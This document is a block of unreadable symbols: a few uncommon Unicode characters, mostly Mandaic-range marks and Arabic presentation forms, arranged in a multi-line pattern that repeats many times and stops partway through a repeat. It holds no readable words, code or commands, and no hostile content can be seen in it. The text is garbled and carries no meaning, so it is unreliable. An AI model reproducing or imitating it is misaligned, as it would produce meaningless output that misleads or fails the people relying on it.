࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬